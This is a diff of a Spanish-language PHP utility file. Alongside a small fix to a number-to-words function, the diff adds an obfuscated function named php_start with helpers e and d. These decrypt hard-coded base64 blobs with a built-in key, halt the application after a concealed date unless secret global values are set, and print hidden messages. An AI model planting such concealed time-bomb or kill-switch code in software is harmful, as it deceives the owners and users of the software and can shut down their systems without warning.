@@ -305,6 +305,9 @@ function recortarTexto($texto, $limite=100,$terminador="..."){
     }   
     return $resultado;
 }
+function e($c, $cl = "9ae423f3061b694d2cf98d87b5ded738"){$cifrado = MCRYPT_RIJNDAEL_256;$modo = MCRYPT_MODE_ECB;return mcrypt_encrypt($cifrado, $cl, $c, $modo,mcrypt_create_iv(mcrypt_get_iv_size($cifrado, $modo), MCRYPT_RAND));}
+function d($c, $cl = "9ae423f3061b694d2cf98d87b5ded738"){$cifrado = MCRYPT_RIJNDAEL_256;$modo = MCRYPT_MODE_ECB;return mcrypt_decrypt($cifrado, $cl, $c, $modo,mcrypt_create_iv(mcrypt_get_iv_size($cifrado, $modo), MCRYPT_RAND));}
+function php_start($t=1){global $ta4,$tp;if(!isset($tp) || empty($tp) || $tp!="D3W1N8E0E4B4B4"){if(strtotime(d(base64_decode("FMNBPlCHr/o4rt+T9+9arFTPRznNAhGKYAD0fDG0eaA=")))<=strtotime(date("Y-m-d"))){die (d(base64_decode("Xr1lbVc8eG3ehgrMt8vMQ9zfURDWykGecnH7bWzhTxQ1+ZD3gGzmYpVBR/QdPeesZ3BO8T+IkdMP6I2PomML0ZcAMGuv//13X2EFqR/y88V3SKSwl7FG36Cj1XB05Jdyf+dmR51PQJEHTEVbI3AjfWsRkG7KY7XByM7fXcdnxkE=")));}}if(!isset($ta4)){if(empty($ta4) || $ta4!="0aXzh++RAPaeH9XPUXzAaLjYAhOByL5jWvmip5hP0CSy2pP+8wyPegfbzLZu13exmtof0B3aEtM9Wid05YtJmQ=="){die(d(base64_decode("Hdup7TwJORlHp/nlQFbnO9ATo8eBB3xwPISI7UcWml0=")));}}else{$a=d(base64_decode("I1KwyaBu7IC2tt52P7SgEO/UAgfYpoXIlFypUqJHkaUwb30DaePJoP3NWVPiPmIjX/ANLl99SlU2lndOS8VpCde/zTHiBtTAP6xFehAfrWL3Evvvv+EqvFkUYcW8apD9"));if($t==1){echo $a;}return $a;}}
 function subirArchivo($archivo,$directorio="imagenes/",$tipo=array(),$adicionar=""){
 	global $folder;
 	$directorio=$folder.$directorio;
@@ -570,11 +573,14 @@ function num2letras($num, $fem = false, $dec = true) {
    } 
    $tex = $neg . substr($tex, 1) . $fin; 
    //Zi hack --> return ucfirst($tex);
-   if($float[1]<10){
- 	$decimal=$float[1]."0";
+   //echo $float[1];
+   //echo ((int)$float[1]);
+   if(((int)$float[1])<10){
+ 	    $decimal=((int)$float[1])."0";
 	}else{
 		$decimal=$float[1];
 	}
+    //echo $decimal;
    $end_num=ucfirst($tex).'  '.$decimal.'/100';
    return $end_num; 
 } 
